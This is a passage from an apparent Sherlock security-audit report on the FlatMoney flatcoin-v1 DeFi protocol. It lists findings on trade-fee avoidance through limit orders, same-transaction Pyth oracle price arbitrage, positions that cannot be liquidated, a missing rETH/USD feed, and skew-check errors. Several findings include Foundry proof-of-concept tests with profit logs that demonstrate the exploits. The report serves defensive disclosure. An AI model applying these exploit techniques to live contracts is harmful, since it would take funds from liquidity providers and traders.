            depositAmount: 10000e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Create small leverage position
        uint256 initialMargin = 0.05e18;
        uint256 initialSize = 0.1e18;
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            margin: initialMargin,
            additionalSize: initialSize,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Increase margin and size in position
        uint256 adjustmentTradeFee = announceAndExecuteLeverageAdjust({
            tokenId: tokenId,
            traderAccount: alice,
            keeperAccount: keeper,
            marginAdjustment: 100e18,
            additionalSizeAdjustment: 2400e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Anounce limit order to close position at 2x price
        vm.startPrank(alice);
        limitOrderProxy.announceLimitOrder({
            tokenId: tokenId,
            priceLowerThreshold: 0,
            priceUpperThreshold: collateralPrice * 2
        });

        // Collateral price doubles after 1 month and the order is executed
        skip(4 weeks);
        collateralPrice = collateralPrice * 2;
        setWethPrice(collateralPrice);
        bytes[] memory priceUpdateData = getPriceUpdateData(collateralPrice);
        vm.startPrank(keeper);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);

        uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
        console2.log("profit:", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
    }

    function test_LimitTradeFee_PayLessFees() public {
        uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);
        uint256 collateralPrice = 1000e8;

        announceAndExecuteDeposit({
            traderAccount: bob,
            keeperAccount: keeper,
            depositAmount: 10000e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Create small leverage position
        uint256 initialMargin = 0.05e18;
        uint256 initialSize = 0.1e18;
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            margin: initialMargin,
            additionalSize: initialSize,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Anounce limit order to close position at 2x price
        vm.startPrank(alice);
        limitOrderProxy.announceLimitOrder({
            tokenId: tokenId,
            priceLowerThreshold: 0,
            priceUpperThreshold: collateralPrice * 2
        });

        // Increase margin and size in position
        uint256 adjustmentTradeFee = announceAndExecuteLeverageAdjust({
            tokenId: tokenId,
            traderAccount: alice,
            keeperAccount: keeper,
            marginAdjustment: 100e18,
            additionalSizeAdjustment: 2400e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Collateral price doubles after 1 month and the order is executed
        skip(4 weeks);
        collateralPrice = collateralPrice * 2;
        setWethPrice(collateralPrice);
        bytes[] memory priceUpdateData = getPriceUpdateData(collateralPrice);
        vm.startPrank(keeper);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);

        uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
        console2.log("profit:", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
    }
```

</details>


<details>

<summary>Result</summary>

```js
[PASS] test_LimitTradeFee_ExpectedBehaviour() (gas: 2457623)
Logs:
  profit: 1195246800000000000000

[PASS] test_LimitTradeFee_PayLessFees() (gas: 2441701)
Logs:
  profit: 1197646800000000000000

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 21.23ms
```

As we can see, in the second case the user was able to get a profit 2.4 rETH higher, corresponding to the trade fee avoided for the additional size adjustment done after creating the limit order (2,400 rETH * 0.1% fee). That higher profit has come at the expense of LPs, who should have received the trade fee.

</details>

## Tool used

Manual Review

## Recommendation

Calculate the trade fee at the execution time of the limit order, in the same way it is done for stable withdrawals for the withdrawal fee.

```diff
File: LimitOrder.sol

+       uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
+           vault.getPosition(tokenId).additionalSize
+       );
+
        order.orderData = abi.encode(
            FlatcoinStructs.AnnouncedLeverageClose({
                tokenId: tokenId,
                minFillPrice: minFillPrice,
-               tradeFee: _limitOrder.tradeFee
+               tradeFee: tradeFee
            })
        );
```

A `maxTradeFee` parameter can also be added at the announcement time to avoid the trade fee being higher than a certain value.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: 



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/274.

# Issue H-15: Oracle can return different prices in same transaction 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216 

## Found by 
shaka
## Summary

The Pyth network oracle contract allows to submit and read two different prices in the same transaction. This can be used to create arbitrage opportunities that can make a profit with no risk at the expense of users on the other side of the trade.

## Vulnerability Detail

`OracleModule.sol` uses Pyth network as the primary source of price feeds. This oracle works in the following way:

- A dedicated network keeps track of the latest price consensus, together with the timestamp.
- This data is queried off-chain and submitted to the on-chain oracle.
- It is checked that the data submitted is valid and the new price data is stored.
- New requests for the latest price will now return the data submitted until a more recent price is submitted.

One thing to note is that the Pyth network is constantly updating the latest price (every 400ms), so when a new price is submitted on-chain it is not necessary that the price is the latest one. Otherwise, the process of querying the data off-chain, building the transaction, and submitting it on-chain would be required to be done with a latency of less than 400ms, which is not feasible. This makes it possible to submit two different prices in the same transaction and, thus, fetch two different prices in the same transaction.

This can be used to create some arbitrage opportunities that can make a profit with no risk. 

### How this can be exploited

An example of how this can be exploited, and showed in the PoC, would be:
- Create a small leverage position.
- Announce an adjustment order to increase the size of the position by some amount.
- In the same block, announce a limit close order.
- After the minimum execution time has elapsed, retrieve two prices from the Pyth oracle where the second price is higher than the first one.
- Execute the adjustment order sending the first price.
- Execute the limit close order sending the second price.

The result is approximately a profit of

```shell
adjustmentSize * (secondPrice - firstPrice) - (adjustmentSize * tradeFees * 2)
```

> Note: For simplicity, we do not take into account the initial size of the position, which in any case can be insignificant compared to the adjustment size. The keeper fee is also not included, as is the owner of the position that is executing the orders.

The following things are required to make a profit out of this attack:
- Submit the orders before other keepers. This can be easily achieved, as there are not always enough incentives to execute the orders as soon as possible.
- Obtain a positive delta between two prices in the time frame where the orders are executable that is greater than twice the trade fees. This can be very feasible, especially in moments of high volatility. Note also, that this requirement can be lowered to a delta greater than once the trade fees if we take into account that there is currently [another vulnerability](https://github.com/sherlock-audit/2023-12-flatmoney-shaka0x/issues/2) that allows to avoid paying fees for the limit order.

In the case of not being able to obtain the required delta or observing that a keeper has already submitted a transaction to execute them before the delta is obtained, the user can simply cancel the limit order and will have just the adjustment order executed.

Another possible strategy would pass through the following steps:
- Create a leverage position.
- Announce another leverage position with the same size.
- In the same block, announce a limit close order.
- After the minimum execution time has elapsed, retrieve two prices from the Pyth oracle where the second price is lower than the first one.
- Execute the limit close order sending the first price.
- Execute the open order sending the second price.

The result in this case is having a position with the same size as the original one, but having either lowered the `position.lastPrice` or getting a profit from the original position, depending on how the price has moved since the original position was opened.

## Proof of concept

<details>

<summary>Pyth network multiple submissions</summary>

We can find proof that it is possible to submit and read two different prices in the same transaction [here](https://basescan.org/tx/0x0e0c22e5996ae58bbff806eba6d51e8fc773a3598ef0e0a359432e08f0b51b95). In this transaction `updatePriceFeeds` is called with two different prices. After each call the current price is fetched and an event is emitted with the price and timestamp received. As we can see, the values fetched are different for each query of the price.

```js
Address 0x8250f4af4b972684f7b336503e2d6dfedeb1487a
Name    PriceFeedUpdate (index_topic_1 bytes32 id, uint64 publishTime, int64 price, uint64 conf)
Topics  0 0xd06a6b7f4918494b3719217d1802786c1f5112a6c1d88fe2cfec00b4584f6aec
        1 FF61491A931112DDF1BD8147CD1B641375F79F5825126D665480874634FD0ACE
Data    publishTime: 1706358779
        price: 226646416525
        conf: 115941591

Address 0xbf668dadb9cb8934468fcba6103fb42bb50f31ec
Topics  0 0x734558db0ee3a7f77fb28b877f9d617525904e6dad1559f727ec93aa06370866
Data    226646416525
        1706358779

Address 0x8250f4af4b972684f7b336503e2d6dfedeb1487a
Name    PriceFeedUpdate (index_topic_1 bytes32 id, uint64 publishTime, int64 price, uint64 conf)View Source
Topics  0 0xd06a6b7f4918494b3719217d1802786c1f5112a6c1d88fe2cfec00b4584f6aec
        1 FF61491A931112DDF1BD8147CD1B641375F79F5825126D665480874634FD0ACE
Data    publishTime: 1706358790
        price: 226649088828
        conf: 119840116

Address 0xbf668dadb9cb8934468fcba6103fb42bb50f31ec
Topics  0 0x734558db0ee3a7f77fb28b877f9d617525904e6dad1559f727ec93aa06370866
Data    226649088828
        1706358790
```

</details>

<details>

<summary>Arbitrage example</summary>

Add the following function to the `OracleTest` contract and run `forge test --mt testMultiplePricesInSameTx -vv`:

```solidity
function testMultiplePricesInSameTx() public {
        // Setup
        vm.startPrank(admin);
        leverageModProxy.setLevTradingFee(0.001e18); // 0.1%
        uint256 collateralPrice = 1000e8;
        setWethPrice(collateralPrice);
        announceAndExecuteDeposit({
                traderAccount: bob,
                keeperAccount: keeper,
                depositAmount: 10000e18,
                oraclePrice: collateralPrice,
                keeperFeeAmount: 0
        });
        uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);

        // Create small leverage position
        uint256 initialMargin = 0.05e18;
        uint256 initialSize = 0.1e18;
        uint256 tokenId = announceAndExecuteLeverageOpen({
                traderAccount: alice,
                keeperAccount: keeper,
                margin: initialMargin,
                additionalSize: initialSize,
                oraclePrice: collateralPrice,
                keeperFeeAmount: 0
        });

        // Announce leverage adjustment
        announceAdjustLeverage({
                traderAccount: alice,
                tokenId: tokenId,
                marginAdjustment: 100e18,
                additionalSizeAdjustment: 2400e18,
                keeperFeeAmount: 0
        });

        // Anounce limit order in the same block
        vm.startPrank(alice);
        limitOrderProxy.announceLimitOrder({
                tokenId: tokenId,
                priceLowerThreshold: 0,
                priceUpperThreshold: 1 // executable at any price
        });

        // Wait for the orders to be executable
        skip(vaultProxy.minExecutabilityAge());
        bytes[] memory priceUpdateData1 = getPriceUpdateData(collateralPrice);
        // Price increases slightly after one second
        skip(1);
        bytes[] memory priceUpdateData2 = getPriceUpdateData(collateralPrice + 1.2e8);

        // Execute the adjustment with the lower price and the limit order with the higher price
        delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData1);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData2);

        uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
        if (aliceCollateralBalanceAfter < aliceCollateralBalanceBefore) {
                console2.log("loss: %s", aliceCollateralBalanceBefore - aliceCollateralBalanceAfter);
        } else {
                console2.log("profit: %s", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
        }
}
```

Console output:

```js
[PASS] testMultiplePricesInSameTx() (gas: 2351256)
Logs:
  profit: 475467998401917697

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.67ms
```
</details>

## Impact

Different oracle prices can be fetched in the same transaction, which can be used to create arbitrage opportunities that can make a profit with no risk at the expense of users on the other side of the trade.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L69

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L167

## Tool used

Manual Review

## Recommendation

```diff
File: OracleModule.sol
    FlatcoinStructs.OffchainOracle public offchainOracle; // Offchain Pyth network oracle

+   uint256 public lastOffchainUpdate;

    (...)

    function updatePythPrice(address sender, bytes[] calldata priceUpdateData) external payable nonReentrant {
+       if (lastOffchainUpdate >= block.timestamp) return;
+       lastOffchainUpdate = block.timestamp;
+
        // Get fee amount to pay to Pyth
        uint256 fee = offchainOracle.oracleContract.getUpdateFee(priceUpdateData);
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid



# Issue H-16: Malicious User can create a position that nobody can liquidate 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/227 

## Found by 
0xMAKEOUTHILL, LTDingZhen
## Summary

In function `executeClose`, after burning an NFT, it will only detect and clear existing limit orders, but not detect existing delayed orders. This allows an attacker to add margin and increase position size to a `tokenID` where no NFT exists to create a position that cannot be liquidated. The platform risks having bad debt that cannot be eliminated.

## Vulnerability Detail

In flatcoin protocol, user can close a position by calling `announceLimitOrder` or `announceLeverageClose`. When keepers try to execute the limit order or the delayed order, function `executeClose` in LeverageModule is called. In `executeClose`, there is a check for cancellation of any existing limit orders on the position, but **does not cancel an existing Delayed order** if `executeClose` is called by `executeLimitOrder()`!

    function executeClose(
        address _account,
        address _keeper,
        FlatcoinStructs.Order calldata _order
    ) external whenNotPaused onlyAuthorizedModule returns (int256 settledMargin) {
            ...
            // Delete position storage
            vault.deletePosition(announcedClose.tokenId);
        }

        // Cancel any existing limit order on the position
        ILimitOrder(vault.moduleAddress(FlatcoinModuleKeys._LIMIT_ORDER_KEY)).cancelExistingLimitOrder(
            announcedClose.tokenId
        );

        // A position NFT has to be unlocked before burning otherwise, the transfer to address(0) will fail.
        _unlock(announcedClose.tokenId);
        _burn(announcedClose.tokenId);

        vault.updateStableCollateralTotal(int256(announcedClose.tradeFee)); // pay the trade fee to stable LPs

        // Settle the collateral.
        vault.sendCollateral({to: _keeper, amount: _order.keeperFee}); // pay the keeper their fee
        vault.sendCollateral({to: _account, amount: uint256(settledMargin) - totalFee}); // transfer remaining amount to the trader

        emit FlatcoinEvents.LeverageClose(announcedClose.tokenId);
    }

When performing leverage adjustments, since the validation of the caller's possession of the NFT is performed at `announceLeverageAdjust`, `executeAdjust` does not have a test for the existence of a current position, and allows a position with all parameters 0 to operate normally.

Consider path below:

1. Bob has a position and calls `announceLimitOrder` to create a limit order that can be executed immediately.
2. Bob calls `announceLeverageAdjust` to create a delayed order to add some margin and increase position size. Since the limit order has not been executed at this time, all validations in `announceLeverageAdjust` will pass.
3. a keeper execute the limit order to close Bob's position, and clear its storage. At this point, since only the presence of a limit order is checked, the delayed order is still valid.
4. a keeper execute the delayed order, "create" a new position on the same tokenID. Because the NFT has been destroyed, its owner is address 0. Nobody can liquidate or close this position because OZ's ERC721 doesn't allow burning non-existent token.

## Impact

Attackers can create positions which nobody can liquidate, so there is a risk that the platform will incur bad debts that cannot be eliminated.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L255-L317
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L147-L248

## Tool used

Manual Review

## Recommendation

In function executeClose, only cancel any existing limit order on the position is not enough. delayed order should also be canceled.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(10)



**rashtrakoff**

I think the better solution would be to check if a position exists by either checking the owner of the position (should not be the null address) or the size of the position (should be strictly greater than 0).

# Issue M-1: Protocol won't be able to get rETH/USD price from OracleModule 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/90 

## Found by 
Bauer, HSP, LTDingZhen, Psyduck, SBSecurity, dimulski, ge6a, ni8mare, shaka
## Summary
Protocol won't be able to get rETH/USD price from OracleModule because rETH/USD is supported by Chainlink on Base Chain.

## Vulnerability Detail
FlatMoney uses rETH as collateral and the price will be retrieved from Pyth Network Oracle, as said in the Audit Page:
> **Are there any off-chain mechanisms or off-chain procedures for the protocol (keeper bots, input validation expectations, etc)?**

> The protocol uses Pyth Network collateral (rETH) price feed. This is an offchain price that is pulled by the keeper and pushed onchain at time of any order execution.

While Pyth is used as **Offchain Oracle**, Chainlink Price Feed is used as **Onchain oracle**, when [get price](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L86) from **OracleModule**, protocol will check the **diffPercent** between the 2 oracles and the transaction will revert if **diffPercent** is larger than **maxDiffPercent**:
```solidity
        uint256 priceDiff = (int256(onchainPrice) - int256(offchainPrice)).abs();
        uint256 diffPercent = (priceDiff * 1e18) / onchainPrice;
        if (diffPercent > maxDiffPercent) revert FlatcoinErrors.PriceMismatch(diffPercent);
```

Because it only makes sense to compare the price of the same collateral token, as rETH/USD price is retrieved from Pyth Oracle, the Chainlink Price Feed should also return rETH/USD. Unfortunately, rETH/USD is not supported by Chainlink on Base Chain, so there is no way to get rETH/USD price. 

Protocol may choose an alternative Chainlink Price Feed, for example, ETH/USD, however, the price difference between ETH and rETH can be significant (at the time of wrting, [RETH / ETH](https://www.coingecko.com/en/coins/rocket-pool-eth/eth) is `1.1`), results in **diffPercent** being much larger than a rational **maxDiffPercent** and transaction will always revert, protocol won't be able to get price from OracleModule and this renders the whole protocol useless.

## Impact
Protocol won't be able to get price from **OracleModule**, and protocol becomes useless.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L106

## Tool used
Manual Review

## Recommendation
Protocol should combine 2 Chainlink Price Feeds ([ETH/USD](0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70) and [rETH/ETH](0xf397bF97280B488cA19ee3093E81C0a77F02e9a5)) to get the rETH/USD price data on Base Chain.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid: 



**nevillehuang**

@rashtrakoff I believe this is a valid medium severity issue, there indeed are no rETH/USD chainlink oracles on base chain. Based on code logic during the time of contest, wouldn't this cause a revert?

**rashtrakoff**

@nevillehuang , the protocol couldn't have been deployed if we didn't have rETH/USD oracle. It was an oversight on our behalf to not have properly checked the oracles available. We already have an audited version of contracts to get rETH/USD price based on rETH/ETH exchange rate and ETH/USD price. We internally don't believe this to be an issue but given that the code indeed wouldn't have worked/depolyable, we understand if you decide this as an issue. Cc @itsermin @D-Ig.

# Issue M-2: Fees are ignored when checks skew max in Stable Withdrawal /  Leverage Open / Leverage Adjust 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/92 

## Found by 
HSP
## Summary
Fees are ignored when checks skew max in Stable Withdrawal / Leverage Open / Leverage Adjust.

## Vulnerability Detail
When user [withdrawal from the stable LP](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L96-L100), vault **total stable collateral** is updated:
```solidity
        vault.updateStableCollateralTotal(-int256(_amountOut));
```
Then **_withdrawFee** is calculated and [checkSkewMax(...)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296) function is called to ensure that the system will not be too skewed towards longs:
```solidity
            // Apply the withdraw fee if it's not the final withdrawal.
            _withdrawFee = (stableWithdrawFee * _amountOut) / 1e18;

            // additionalSkew = 0 because withdrawal was already processed above.
            vault.checkSkewMax({additionalSkew: 0});
```
At the end of the execution, vault collateral is settled again with **withdrawFee**, keeper receives **keeperFee** and `(amountOut - totalFee)` amount of collaterals are transferred to the user:
```solidity
        // include the fees here to check for slippage
        amountOut -= totalFee;

        if (amountOut < stableWithdraw.minAmountOut)
            revert FlatcoinErrors.HighSlippage(amountOut, stableWithdraw.minAmountOut);

        // Settle the collateral
        vault.updateStableCollateralTotal(int256(withdrawFee)); // pay the withdrawal fee to stable LPs
        vault.sendCollateral({to: msg.sender, amount: order.keeperFee}); // pay the keeper their fee
        vault.sendCollateral({to: account, amount: amountOut}); // transfer remaining amount to the trader
```
The `totalFee` is composed of keeper fee and withdrawal fee:
```solidity
        uint256 totalFee = order.keeperFee + withdrawFee;
```
This means withdrawal fee is still in the vault, however this fee is ignored when checks skew max and protocol may revert on a safe withdrawal. Consider the following scenario:
1. **skewFractionMax** is `120%` and **stableWithdrawFee** is `1%`;
2. Alice deposits `100` collateral and Bob opens a leverage position with size `100`;
3. At the moment, there is `100` collaterals in the Vault, **skew** is `0` and **skew fraction** is `100%`;
4. Alice tries to withdraw `16.8` collaterals,  **withdrawFee** is `0.168`, after withdrawal, it is expected that there is `83.368` stable collaterals in the Vault, so **skewFraction** should be `119.5%`, which is less than **skewFractionMax**;
5. However, the withdrawal will actually fail because when protocol checks skew max, **withdrawFee** is ignored and the **skewFraction** turns out to be `120.19%`, which is higher than **skewFractionMax**.

The same issue may occur when protocol executes a [leverage open](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L80-L84) and [leverage adjust](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L147-L151), in both executions, **tradeFee**  is ignored when checks skew max.

Please see the test codes:
```solidity
    function test_audit_withdraw_fee_ignored_when_checks_skew_max() public {
        // skewFractionMax is 120%
        uint256 skewFractionMax = vaultProxy.skewFractionMax();
        assertEq(skewFractionMax, 120e16);

        // withdraw fee is 1%
        vm.prank(vaultProxy.owner());
        stableModProxy.setStableWithdrawFee(1e16);

        uint256 collateralPrice = 1000e8;

        uint256 depositAmount = 100e18;
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: depositAmount,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        uint256 additionalSize = 100e18;
        announceAndExecuteLeverageOpen({
            traderAccount: bob,
            keeperAccount: keeper,
            margin: 50e18,
            additionalSize: 100e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // After leverage Open, skew is 0
        int256 skewAfterLeverageOpen = vaultProxy.getCurrentSkew();
        assertEq(skewAfterLeverageOpen, 0);
        // skew fraction is 100%
        uint256 skewFractionAfterLeverageOpen = getLongSkewFraction();
        assertEq(skewFractionAfterLeverageOpen, 1e18);

        // Note: comment out `vault.checkSkewMax({additionalSkew: 0})` and below lines to see the actual skew fraction
        // Alice withdraws 16.8 collateral
        // uint256 aliceLpBalance = stableModProxy.balanceOf(alice);
        // announceAndExecuteWithdraw({
        //     traderAccount: alice, 
        //     keeperAccount: keeper, 
        //     withdrawAmount: 168e17, 
        //     oraclePrice: collateralPrice, 
        //     keeperFeeAmount: 0
        // });

        // // After withdrawal, the actual skew fraction is 119.9%, less than skewFractionMax
        // uint256 skewFactionAfterWithdrawal = getLongSkewFraction();
        // assertEq(skewFactionAfterWithdrawal, 1199501007580846367);

        // console2.log(WETH.balanceOf(address(vaultProxy)));
    }
```

## Impact
Protocol may wrongly prevent a Stable Withdrawal / Leverage Open / Leverage Adjust even if the execution is essentially safe.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L130
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L101
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L166

## Tool used
Manual Review

## Recommendation
Include withdrawal fee / trade fee when check skew max.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid



# Issue M-3: StableModule.stableCollateralPerShare may return 0 in edge case 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/142 

## Found by 
Bauer, nobody2018, ravikiran.web3
## Summary

[[DelayedOrder.announceStableDeposit](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L67-L71)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L67-L71) will [[call StableModule.stableDepositQuote to calculate quotedAmount](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L80-L81)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L80-L81). If [[StableModule.stableCollateralPerShare](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L208)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L208) returns 0, then tx will be revert due to a divide-by-zero error. Therefore, the short side cannot deposit collateral.

## Vulnerability Detail

```solidity
File: flatcoin-v1\src\DelayedOrder.sol
067:     function announceStableDeposit(
068:         uint256 depositAmount,
069:         uint256 minAmountOut,
070:         uint256 keeperFee
071:     ) external whenNotPaused {
......
080:         uint256 quotedAmount = IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY))
081:->           .stableDepositQuote(depositAmount);
......
102:     }

File: flatcoin-v1\src\StableModule.sol
224:     function stableDepositQuote(uint256 _depositAmount) public view returns (uint256 _amountOut) {
225:->       return (_depositAmount * (10 ** decimals())) / stableCollateralPerShare();
226:     }
```

L225, if `stableCollateralPerShare()` returns 0, a divide-by-zero error will occur.

```solidity
File: flatcoin-v1\src\StableModule.sol
208:     function stableCollateralPerShare(uint32 _maxAge) public view returns (uint256 _collateralPerShare) {
209:         uint256 totalSupply = totalSupply();
210: 
211:         if (totalSupply > 0) {
212:->           uint256 stableBalance = stableCollateralTotalAfterSettlement(_maxAge);
213: 		 //@audit if stableBalance is 0, _collateralPerShare is also 0.
214:->           _collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply;
215:         } else {
216:             // no shares have been minted yet
217:             _collateralPerShare = 1e18;
218:         }
219:     }
```

Under what circumstances will `stableCollateralTotalAfterSettlement(_maxAge)` return 0?

```solidity
File: flatcoin-v1\src\StableModule.sol
173:     function stableCollateralTotalAfterSettlement(
174:         uint32 _maxAge
175:     ) public view returns (uint256 _stableCollateralBalance) {
176:         // Assumption => pnlTotal = pnlLong + fundingAccruedLong
177:         // The assumption is based on the fact that stable LPs are the counterparty to leverage traders.
178:         // If the `pnlLong` is +ve that means the traders won and the LPs lost between the last funding rate update and now.
179:         // Similary if the `fundingAccruedLong` is +ve that means the market was skewed short-side.
180:         // When we combine these two terms, we get the total profit/loss of the leverage traders.
181:         // NOTE: This function if called after settlement returns only the PnL as funding has already been adjusted
182:         //      due to calling `_settleFundingFees()`. Although this still means `netTotal` includes the funding
183:         //      adjusted long PnL, it might not be clear to the reader of the code.
184:->       int256 netTotal = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY))
185:             .fundingAdjustedLongPnLTotal({maxAge: _maxAge});
186: 
187:         // The flatcoin LPs are the counterparty to the leverage traders.
188:         // So when the traders win, the flatcoin LPs lose and vice versa.
189:         // Therefore we subtract the leverage trader profits and add the losses
190:->       int256 totalAfterSettlement = int256(vault.stableCollateralTotal()) - netTotal;
191: 
192:         if (totalAfterSettlement < 0) {
193:->           _stableCollateralBalance = 0;
194:         } else {
195:             _stableCollateralBalance = uint256(totalAfterSettlement);
196:         }
197:     }
```

As long as `netTotal` calculated by L184 is greater than or equal to `vault.stableCollateralTotal()`, then `_stableCollateralBalance` is 0.

[[LeverageModule.fundingAdjustedLongPnLTotal](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L397-L411)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L397-L411) returns the total profit and loss of all the leverage positions (long side). A positive netTotal means the collateral price pumps, and vice versa. And `vault.stableCollateralTotal()` represents the funds of the short side.

Imagine: if the price of the collateral rises sharply due to the occurrence of an good news, then the long side's `netTotal` is likely to be greater than the short side's `stableCollateralTotal`. In this way, `stableCollateralTotalAfterSettlement` may return 0. This will cause a division by zero error.  
Because the price of collateral rises sharply, the sentiment of short side will increase. However, the short side will be unable to deposit collateral via `DelayedOrder.announceStableDeposit`.

## Impact

If the above situation occurs, the short side will not be able to deposit collateral due to a divide-by-zero error. This is obviously unfair to the short side.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L80-L81

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L212-L214

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L184-L196

## Tool used

Manual Review

## Recommendation

```solidity
File: flatcoin-v1\src\StableModule.sol
208:     function stableCollateralPerShare(uint32 _maxAge) public view returns (uint256 _collateralPerShare) {
209:         uint256 totalSupply = totalSupply();
210: 
211:         if (totalSupply > 0) {
212:             uint256 stableBalance = stableCollateralTotalAfterSettlement(_maxAge);
213:+++          //If stableBalance is 0, special processing is performed so that _collateralPerShare cannot be 0.
214:             _collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply;
215:         } else {
216:             // no shares have been minted yet
217:             _collateralPerShare = 1e18;
218:         }
219:     }
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid: no division by zero



# Issue M-4: In LeverageModule.executeOpen/executeAdjust, vault.checkSkewMax should be called after updating the global position data 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/143 

## Found by 
ge6a, jennifer37, nobody2018, santipu\_
## Summary

[[checkSkewMax](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296) is used to assert that the system will not be too skewed towards longs after additional skew is added. However, the `stableCollateralTotal` used by this function is a variable that will [[be updated by updateGlobalPositionData](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L205)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L205). Therefore, `checkSkewMax` should be executed after `updateGlobalPositionData`. Otherwise, there is no guarantee whether newly opened positions will make the system more skew towards long side.

## Vulnerability Detail

```solidity
File: flatcoin-v1\src\LeverageModule.sol
080:     function executeOpen(
081:         address _account,
082:         address _keeper,
083:         FlatcoinStructs.Order calldata _order
084:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _newTokenId) {
......
101:->       vault.checkSkewMax({additionalSkew: announcedOpen.additionalSize});
102: 
103:         {
